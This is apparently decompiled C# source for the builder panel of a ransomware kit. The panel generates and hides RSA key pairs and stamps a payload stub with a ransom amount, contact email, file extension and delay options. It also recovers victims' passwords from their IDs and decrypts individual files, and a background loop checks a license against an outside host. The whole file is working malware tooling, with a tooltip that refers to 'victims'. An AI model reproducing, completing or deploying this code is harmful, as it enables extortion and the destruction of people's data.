using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Core;

namespace Builder
{
	// Token: 0x02000004 RID: 4
	public partial class Form1 : Form
	{
		// Token: 0x06000006 RID: 6 RVA: 0x00002760 File Offset: 0x00000960
		public Form1()
		{
			this.license_0 = new Core.License("http://cr4ckz.coolpage.biz/");
			this.string_0 = Path.GetDirectoryName(Application.ExecutablePath);
			
			this.InitializeComponent();
			this.toolTip_0.SetToolTip(this.button3, "Reset key settings & all previous victims are no longer valid.");
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000027BC File Offset: 0x000009BC
		private void button1_Click(object sender, EventArgs e)
		{
			string text = "[" + DateTime.Now + "]";
			string text2 = this.numRansom.Value.ToString();
			string text3 = this.txtEmail.Text;
			string text4 = File.ReadAllText(this.string_0 + "\\pubkey.dat");
			string text5 = this.txtExtension.Text;
			string text6 = "NO";
			string text7 = "NO";
			string text8 = "NO";
			string text9 = "NO";
			this.saveFileDialog_1.Filter = "executable (.exe)|*.exe";
			DialogResult dialogResult = this.saveFileDialog_1.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				this.listBox1.Items.Add(text + " Preparing...");
				File.Copy(this.string_0 + "\\stub.dat", this.saveFileDialog_1.FileName, true);
				if (this.checkBox2.Checked)
				{
					text7 = "YES";
				}
				if (this.checkBox1.Checked)
				{
					text6 = this.delayTime.Value.ToString("d");
				}
				if (this.checkBox3.Checked)
				{
					text8 = this.txtFileTest.Text;
				}
				if (this.checkBox4.Checked)
				{
					text9 = "YES";
				}
				this.listBox1.Items.Add(text + " Rebuilding code...");
				using (FileStream fileStream = new FileStream(this.saveFileDialog_1.FileName, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
				{
					using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
					{
						fileStream.Position = fileStream.Length + 1L;
						binaryWriter.Write(string.Concat(new string[]
						{
							"***", text4, "|", text3, "|", text2, "|", text5, "|", text6,
							"|", text7, "|", text8, "|", text9
						}));
						this.listBox1.Items.Add(text + " Completed...");
					}
				}
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002A60 File Offset: 0x00000C60
		private void Form1_Load(object sender, EventArgs e)
		{
			if (!File.Exists(Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "privkey.dat")))
			{
				RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider();
				string text = this.base64Encode(rsacryptoServiceProvider.ToXmlString(false));
				string text2 = this.base64Encode(rsacryptoServiceProvider.ToXmlString(true));
				File.WriteAllText(this.string_0 + "\\privkey.dat", text2);
				File.WriteAllText(this.string_0 + "\\pubkey.dat", text);
				File.SetAttributes(this.string_0 + "\\pubkey.dat", FileAttributes.Hidden);
				File.SetAttributes(this.string_0 + "\\privkey.dat", FileAttributes.Hidden);
			}
			this.backgroundWorker_0.RunWorkerAsync();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002B10 File Offset: 0x00000D10
		public void EncryptText(string publicKey, string text, string file)
		{
			UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
			byte[] bytes = unicodeEncoding.GetBytes(text);
			byte[] array;
			using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider())
			{
				rsacryptoServiceProvider.FromXmlString(publicKey);
				array = rsacryptoServiceProvider.Encrypt(bytes, false);
			}
			File.WriteAllBytes(file, array);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002B68 File Offset: 0x00000D68
		public string DecryptData(string privateKey, byte[] chiper)
		{
			byte[] array;
			using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider())
			{
				rsacryptoServiceProvider.FromXmlString(privateKey);
				array = rsacryptoServiceProvider.Decrypt(chiper, false);
			}
			UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
			return unicodeEncoding.GetString(array);
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002BC0 File Offset: 0x00000DC0
		public string base64Encode(string plaintext)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(plaintext);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002BE4 File Offset: 0x00000DE4
		public string base64Decode(string plaintext)
		{
			byte[] array = Convert.FromBase64String(plaintext);
			return Encoding.UTF8.GetString(array);
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002C08 File Offset: 0x00000E08
		private void button2_Click(object sender, EventArgs e)
		{
			string text = this.txtID.Text;
			try
			{
				this.txtResult.Text = this.DecryptData(this.base64Decode(File.ReadAllText(this.string_0 + "\\privkey.dat")), Convert.FromBase64String(text));
			}
			catch
			{
				MessageBox.Show("Password can't decrypted", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002C7C File Offset: 0x00000E7C
		private void button3_Click(object sender, EventArgs e)
		{
			DialogResult dialogResult = MessageBox.Show("Are you sure want to generate new key?", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
			if (File.Exists(this.string_0 + "\\pubkey.dat") && File.Exists(this.string_0 + "\\privkey.dat") && dialogResult == DialogResult.Yes)
			{
				RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider();
				string text = this.base64Encode(rsacryptoServiceProvider.ToXmlString(false));
				string text2 = this.base64Encode(rsacryptoServiceProvider.ToXmlString(true));
				File.Delete(this.string_0 + "\\privkey.dat");
				File.Delete(this.string_0 + "\\pubkey.dat");
				File.WriteAllText(this.string_0 + "\\privkey.dat", text2);
				File.WriteAllText(this.string_0 + "\\pubkey.dat", text);
				File.SetAttributes(this.string_0 + "\\pubkey.dat", FileAttributes.Hidden);
				File.SetAttributes(this.string_0 + "\\privkey.dat", FileAttributes.Hidden);
				MessageBox.Show("New key has been generated!");
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002D88 File Offset: 0x00000F88
		private void button5_Click(object sender, EventArgs e)
		{
			DialogResult dialogResult = this.openFileDialog_0.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				this.txtFilePath.Text = this.openFileDialog_0.FileName;
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002DC0 File Offset: 0x00000FC0
		private byte[] method_0(byte[] byte_0, byte[] byte_1)
		{
			byte[] array = null;
			byte[] array2 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xA };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 0x100;
					rijndaelManaged.BlockSize = 0x80;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, array2, 0x3E8);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(byte_0, 0, byte_0.Length);
						cryptoStream.Close();
					}
					array = memoryStream.ToArray();
				}
			}
			return array;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002EC8 File Offset: 0x000010C8
		internal void XhEorlBgd(string string_1, string string_2)
		{
			byte[] array = File.ReadAllBytes(string_1);
			byte[] array2 = Encoding.UTF8.GetBytes(string_2);
			array2 = SHA256.Create().ComputeHash(array2);
			byte[] array3 = this.method_0(array, array2);
			File.WriteAllBytes(string_1, array3);
			string extension = Path.GetExtension(string_1);
			string text = string_1.Substring(0, string_1.Length - extension.Length);
			File.Move(string_1, text);
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002F2C File Offset: 0x0000112C
		private void button4_Click(object sender, EventArgs e)
		{
			string text = this.DecryptData(this.base64Decode(File.ReadAllText(this.string_0 + "\\privkey.dat")), Convert.FromBase64String(this.txtID.Text));
			this.XhEorlBgd(this.txtFilePath.Text, text);
			MessageBox.Show("Done");
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002F88 File Offset: 0x00001188
		private void checkBox3_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox3.Checked)
			{
				DialogResult dialogResult = this.folderBrowserDialog_0.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					this.txtFileTest.Text = this.folderBrowserDialog_0.SelectedPath;
					this.txtFileTest.Enabled = true;
				}
				else
				{
					this.checkBox3.Checked = false;
				}
			}
			else
			{
				this.txtFileTest.Enabled = false;
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x0000228D File Offset: 0x0000048D
		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			this.txtID.Clear();
			this.txtResult.Clear();
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002266 File Offset: 0x00000466
		private void txtResult_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002266 File Offset: 0x00000466
		private void txtResult_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002266 File Offset: 0x00000466
		private void txtResult_DoubleClick(object sender, EventArgs e)
		{
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000022A5 File Offset: 0x000004A5
		private void txtResult_Click(object sender, EventArgs e)
		{
			this.txtResult.SelectAll();
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000022B2 File Offset: 0x000004B2
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox1.Checked)
			{
				this.delayTime.Enabled = true;
			}
			else
			{
				this.delayTime.Enabled = false;
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002266 File Offset: 0x00000466
		private void checkBox2_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002266 File Offset: 0x00000466
		private void method_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002266 File Offset: 0x00000466
		private void timer_0_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002FF8 File Offset: 0x000011F8
		private bool method_2()
		{
			bool flag;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					using (webClient.OpenRead("http://cr4ckz.coolpage.biz/"))
					{
						flag = true;
					}
				}
			}
			catch
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000022DE File Offset: 0x000004DE
		private void method_3()
		{
			this.timer_0.Stop();
			Class1.smethod_3();
			base.Hide();
			new AuthLicense().Show();
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002300 File Offset: 0x00000500
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003064 File Offset: 0x00001264
		private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
		{
			for (;;)
			{
				if (!this.method_2())
				{
					this.timer_0.Stop();
					MessageBox.Show("No internet connection", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					Environment.Exit(0);
				}
				if (Class1.smethod_2() != null)
				{
					string text = this.license_0.LicenseCheker(Class1.smethod_2());
					if (text != "NO")
					{
						if (!this.license_0.IsHashValid(Class1.smethod_2(), text))
						{
							this.method_3();
						}
					}
					else
					{
						this.method_3();
					}
				}
				else
				{
					this.method_3();
				}
				Thread.Sleep(0x2710);
			}
		}

		// Token: 0x04000007 RID: 7
		private Core.License license_0;

		// Token: 0x04000008 RID: 8
		private string string_0;
	}
}
